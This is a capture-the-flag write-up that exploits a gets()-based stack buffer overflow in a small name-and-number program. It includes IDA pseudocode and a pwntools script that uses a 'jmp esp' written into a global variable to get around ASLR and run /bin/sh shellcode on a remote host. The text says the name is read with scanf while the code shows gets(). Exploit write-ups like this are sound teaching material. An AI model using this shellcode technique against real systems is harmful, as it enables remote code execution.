We have a program that asks for a name and a number.
The program prints the name and specifies if the number was odd or even.

If we generate the pseudocode for the program in IDA, we get :

```
	int __cdecl main(int argc, const char **argv, const char **envp)
	{
	  int v4; // [sp+10h] [bp-20h]@1

	  puts("What's your name?");
	  fflush(stdout);
	  gets((char *)&v4);
	  puts("What's your favorite number?");
	  fflush(stdout);
	  __isoc99_scanf("%d", &meow);
	  if ( meow & 1 )
	  {
	    printf("Hello %s, %d is an odd number!\n", &v4, meow);
	    fflush(stdout);
	  }
	  else
	  {
	    printf("Hello %s, %d is an even number!\n", &v4, meow);
	    fflush(stdout);
	  }
	  return 0;
	}
```

Since the name is retrieved with scanf, we can easily write shellcode in the buffer,
overflow the buffer and overwrite the return address in memory after the buffer to
jump to the shellcode (to start /bin/sh) in the buffer. 

However, ASLR is enabled on the server so we cannot hardcode a value to jump to in
the stack. 

Since meow function is global, its address will not change even with ASLR and we can write 
instructions in this variable and use its address as the return address. If we write "jmp esp"
in meow and overwrite the return address with the address of meow (0x804A048), we can execute
"jmp esp" to jump on the stack to our shellcode.

Since the size of the buffer is 32 bytes, we write 32 nops to fill the buffer, then the address
of meow 4 times make sure to overwrite it (it is actually overwritten the 4th time), then some
nops for safety and then our shellcode. The "jmp esp" will actually jump after our buffer because
the stack pointer (esp) is decremented to pop the local variables before main exits.


The following python script retrieves the flag :

	from pwn import *

	meow_address = 0x804A048
	shellcode = asm(shellcraft.sh())
	buf = '\x90'*32 + p32(meow_address)*4 + '\x90'*32 + shellcode

	number = str(0x4040e4ff)#asm('jmp esp')) + 'AA'

	with remote('130.211.202.98', 7575) as p:
		print p.recvuntil('name?')
		p.sendline(buf)
		print p.recvuntil('number?')
		p.sendline(number)
		p.sendline('cat flag.txt')
		print p.recvuntil('}')
